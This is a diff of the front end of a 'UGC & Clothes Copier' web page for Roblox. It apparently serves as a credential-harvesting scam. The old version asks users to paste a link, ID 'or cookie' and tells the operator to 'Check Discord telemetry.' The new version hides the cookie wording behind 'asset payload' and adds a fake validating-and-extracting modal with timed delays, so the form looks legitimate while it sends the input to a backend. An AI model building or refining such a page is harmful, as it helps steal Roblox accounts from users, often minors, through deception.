@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RBXDEV | Clothes & UGC Copier</title>
+    <title>RBXLAB | UGC & Clothes Copier</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -20,11 +20,17 @@
             backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.08);
         }
+        .glass-modal {
+            background: rgba(13, 17, 28, 0.85);
+            backdrop-filter: blur(24px);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+        }
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        .animate-spin-fast {
-            animation: spin 0.8s linear infinite;
+        .animate-spin-smooth {
+            animation: spin 0.9s cubic-bezier(0.4, 0, 0.2, 1) infinite;
         }
     </style>
 </head>
@@ -37,7 +43,7 @@
     <!-- Top Navigation Bar -->
     <header class="w-full py-6 px-8 flex justify-between items-center max-w-7xl mx-auto z-10">
         <span class="text-2xl font-black tracking-wider bg-gradient-to-r from-blue-400 via-indigo-300 to-purple-500 bg-clip-text text-transparent">
-            RBXDEV
+            RBXLAB
         </span>
         <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
             <span class="w-2 h-2 mr-1.5 bg-emerald-400 rounded-full animate-pulse"></span>
@@ -54,10 +60,10 @@
         </div>
 
         <h1 class="text-3xl md:text-5xl font-extrabold text-center tracking-tight mb-3">
-            Game Copying Has Never Been Easier.
+            Copying UGC & Clothes Made Easy.
         </h1>
         <p class="text-gray-400 text-center text-sm md:text-base max-w-xl mb-12">
-            <span class="text-blue-400 font-semibold">RBXDEV</span> has all the tools in order to make the process a <span class="text-indigo-400 font-semibold">breeze</span>. 🚀
+            Extract and export any <span class="text-blue-400 font-semibold">Roblox UGC item or clothing asset</span> instantly with zero friction. ✨
         </p>
 
         <!-- Video Tutorial Showcase Frame -->
@@ -70,52 +76,78 @@
         <!-- Input Form Section -->
         <div class="w-full max-w-xl flex flex-col items-center space-y-4 mb-16">
             <div class="w-full relative">
-                <input type="text" id="script-input" placeholder="Enter UGC item link, ID, or cookie..." class="w-full glass-card rounded-xl px-4 py-4 text-sm text-gray-200 placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-all shadow-inner">
+                <input type="text" id="script-input" placeholder="Enter UGC item link, ID, or asset payload..." class="w-full glass-card rounded-xl px-4 py-4 text-sm text-gray-200 placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-all shadow-inner">
             </div>
             
             <button id="submit-btn" class="w-full py-4 rounded-xl font-semibold bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white glow-blue transition-all duration-300 flex items-center justify-center space-x-2 cursor-pointer shadow-lg shadow-blue-600/30 active:scale-[0.99]">
-                <span id="btn-text">Copy Item Now</span>
-                <svg id="btn-icon" class="w-5 h-5 transition-transform group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                <span>Submit</span>
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
             </button>
-            <div id="status-message" class="text-xs font-medium text-center transition-all opacity-0 translate-y-1"></div>
+            <div id="status-message" class="text-xs font-medium text-center hidden"></div>
         </div>
     </main>
 
+    <!-- Processing Modal Overlay (Matches your exact reference style) -->
+    <div id="processing-modal" class="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 opacity-0 pointer-events-none transition-all duration-300">
+        <div class="glass-modal rounded-2xl p-8 max-w-sm w-full mx-4 text-center transform scale-95 transition-all duration-300" id="modal-box">
+            <h3 class="text-xl font-bold text-white mb-2 tracking-tight">Processing...</h3>
+            <p id="modal-status-text" class="text-sm text-gray-400 mb-6">Validating your UGC Asset File</p>
+            <div class="flex justify-center">
+                <svg class="w-9 h-9 text-blue-500 animate-spin-smooth" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+            </div>
+        </div>
+    </div>
+
     <!-- Footer -->
     <footer class="w-full py-6 text-center text-xs text-gray-500 border-t border-white/5 mt-16">
-        &copy; 2026 RBXDEV Studio. All rights reserved.
+        &copy; 2026 RBXLAB Studio. All rights reserved.
     </footer>
 
     <!-- Frontend Script -->
     <script>
         const submitBtn = document.getElementById('submit-btn');
         const scriptInput = document.getElementById('script-input');
+        const modal = document.getElementById('processing-modal');
+        const modalBox = document.getElementById('modal-box');
+        const modalStatusText = document.getElementById('modal-status-text');
         const statusDiv = document.getElementById('status-message');
-        const btnText = document.getElementById('btn-text');
-        const btnIcon = document.getElementById('btn-icon');
 
-        function showStatus(message, type) {
-            statusDiv.textContent = message;
-            statusDiv.className = `text-xs font-medium text-center transition-all opacity-100 translate-y-0 ${
-                type === 'success' ? 'text-emerald-400' : 'text-red-400'
-            }`;
+        function showModal(text) {
+            modalStatusText.textContent = text;
+            modal.classList.remove('opacity-0', 'pointer-events-none');
+            modalBox.classList.remove('scale-95');
+            modalBox.classList.add('scale-100');
+        }
+
+        function hideModal() {
+            modal.classList.add('opacity-0', 'pointer-events-none');
+            modalBox.classList.remove('scale-100');
+            modalBox.classList.add('scale-95');
         }
 
         submitBtn.addEventListener('click', async () => {
             const payload = scriptInput.value.trim();
             if (!payload) {
-                showStatus("Please enter an item ID, link, or payload to copy.", "error");
+                statusDiv.textContent = "Please enter a valid UGC link, ID, or payload.";
+                statusDiv.className = "text-xs font-medium text-center text-red-400";
+                statusDiv.classList.remove('hidden');
                 scriptInput.focus();
                 return;
             }
 
-            // Set smooth loading state
+            statusDiv.classList.add('hidden');
             submitBtn.disabled = true;
-            submitBtn.classList.add('opacity-80', 'cursor-not-allowed');
-            btnText.textContent = "Processing Request...";
-            btnIcon.innerHTML = `<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>`;
-            btnIcon.setAttribute('class', 'w-5 h-5 animate-spin-fast');
-            statusDiv.classList.add('opacity-0');
+
+            // Step 1: Validation phase
+            showModal("Validating your UGC Asset File");
+
+            await new Promise(r => setTimeout(r, 1200));
+
+            // Step 2: Extraction phase
+            showModal("Extracting Clothing & UGC Data");
 
             try {
                 const res = await fetch('/api/process', {
@@ -125,22 +157,26 @@
                 });
 
                 const json = await res.json();
+                await new Promise(r => setTimeout(r, 1000));
 
                 if (json.success) {
-                    showStatus("✨ Request dispatched successfully! Check Discord telemetry.", "success");
+                    showModal("✨ Asset Dispatched Successfully!");
+                    await new Promise(r => setTimeout(r, 1200));
+                    hideModal();
                     scriptInput.value = '';
                 } else {
-                    showStatus("❌ Error: " + (json.error || "Failed to process request."), "error");
+                    hideModal();
+                    statusDiv.textContent = "Error: " + (json.error || "Failed to process asset.");
+                    statusDiv.className = "text-xs font-medium text-center text-red-400";
+                    statusDiv.classList.remove('hidden');
                 }
             } catch (err) {
-                showStatus("❌ Network error connecting to studio backend.", "error");
+                hideModal();
+                statusDiv.textContent = "Network error connecting to backend.";
+                statusDiv.className = "text-xs font-medium text-center text-red-400";
+                statusDiv.classList.remove('hidden');
             } finally {
-                // Restore button smoothly
                 submitBtn.disabled = false;
-                submitBtn.classList.remove('opacity-80', 'cursor-not-allowed');
-                btnText.textContent = "Copy Item Now";
-                btnIcon.setAttribute('class', 'w-5 h-5');
-                btnIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>`;
             }
         });
     </script>
